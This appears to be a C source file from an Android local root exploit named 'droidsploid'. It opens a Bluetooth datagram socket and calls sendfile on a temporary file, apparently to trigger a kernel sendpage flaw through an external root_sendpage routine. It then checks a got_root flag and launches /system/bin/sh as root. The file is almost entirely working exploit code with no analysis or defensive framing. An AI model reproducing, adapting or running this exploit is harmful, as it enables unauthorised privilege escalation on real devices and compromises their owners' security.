#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <fcntl.h>

extern int got_root;
extern int (*root_sendpage)();

static void do_get_root(void)
{
	int fdin, fdout;
	char template[] = "/sdcard/droidsploidXXXXXX";

	printf("ROOTING\n");

	fdin = mkstemp(template);
	unlink(template);
	ftruncate(fdin, PAGE_SIZE);

	fdout = socket(PF_BLUETOOTH, SOCK_DGRAM, 0);
	sendfile(fdout, fdin, NULL, PAGE_SIZE);

	return;
}

int main(void)
{
	do_get_root();

	if (got_root == 1) {
		printf("Got root!\n");
	} else {
		printf("Didn't get root.\n");
		return -1;
	}

	execl("/system/bin/sh", "/system/bin/sh", "-", NULL);
	return -1;
}
